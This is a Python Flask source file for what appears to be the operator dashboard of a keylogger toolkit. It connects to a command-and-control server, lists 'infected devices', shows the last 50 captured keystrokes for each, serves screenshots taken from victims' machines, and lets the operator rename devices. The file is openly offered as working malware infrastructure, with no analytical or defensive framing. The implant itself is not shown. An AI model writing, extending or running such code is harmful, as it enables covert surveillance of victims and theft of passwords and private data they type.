from flask import Flask, render_template, jsonify, request, send_file
import requests
import json
from datetime import datetime
import os
from pathlib import Path
import threading
import webbrowser

class WebKeyloggerManager:
    def __init__(self, c2_url, web_port=5001):
        self.c2_url = c2_url.rstrip('/')
        self.web_port = web_port
        self.app = Flask(__name__, 
                         template_folder='templates',
                         static_folder='static')
        self.setup_routes()
        
    def setup_routes(self):
        self.app.route('/')(self.dashboard)
        self.app.route('/devices')(self.get_devices_api)
        self.app.route('/device/<device_id>')(self.get_device_data_api)
        self.app.route('/device/<device_id>/keystrokes')(self.get_device_keystrokes)
        self.app.route('/device/<device_id>/screenshots')(self.get_device_screenshots)
        self.app.route('/screenshot/<device_id>/<filename>')(self.view_screenshot)
        self.app.route('/update_name/<device_id>', methods=['POST'])(self.update_device_name)
        self.app.route('/delete_device/<device_id>', methods=['POST'])(self.delete_device)

    def dashboard(self):
        return render_template("dashboard.html")
    
    def get_devices_api(self):
        try:
            response = requests.get(f"{self.c2_url}/devices", timeout=10)
            return jsonify(response.json())
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    def get_device_data_api(self, device_id):
        try:
            response = requests.get(f"{self.c2_url}/device/{device_id}", timeout=10)
            return jsonify(response.json())
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    def get_device_keystrokes(self, device_id):
        try:
            response = requests.get(f"{self.c2_url}/device/{device_id}", timeout=10)
            data = response.json()
            return jsonify({
                "device": data["device"],
                "keystrokes": data["recent_keystrokes"][-50:]  # Last 50 entries
            })
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    def get_device_screenshots(self, device_id):
        try:
            response = requests.get(f"{self.c2_url}/screenshots/{device_id}", timeout=10)
            return jsonify(response.json())
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    def view_screenshot(self, device_id, filename):
        screenshot_path = Path("infected_devices") / device_id / "screenshots" / filename
        if screenshot_path.exists():
            return send_file(screenshot_path, mimetype='image/png')
        return "Screenshot not found", 404

    def update_device_name(self, device_id):
        try:
            new_name = request.json.get('name')
            response = requests.post(
                f"{self.c2_url}/update_device_name",
                json={"device_ip": device_id, "name": new_name},
                timeout=10
            )
            return jsonify({"status": "success"})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    def delete_device(self, device_id):
        # This would remove from local database - implement as needed
        return jsonify({"status": "Device removal not implemented in basic version"})

    def run(self):
        print(f"🌐 Starting Web Management Interface...")
        print(f"📊 Dashboard available at: http://localhost:{self.web_port}")
        print(f"🔗 Connected to C2 Server: {self.c2_url}")
        print("\nPress Ctrl+C to stop the web interface")
        
        # Auto-open browser
        threading.Timer(2, lambda: webbrowser.open(f"http://localhost:{self.web_port}")).start()
        
        self.app.run(host='0.0.0.0', port=self.web_port, debug=False)

def main():
    # Read server URL
    try:
        with open("server_url.txt", "r") as f:
            server_url = f.read().strip()
    except FileNotFoundError:
        print("❌ server_url.txt not found. Run server.py first.")
        return
    
    # Start web interface
    manager = WebKeyloggerManager(server_url, web_port=5001)
    manager.run()

if __name__ == "__main__":
    main()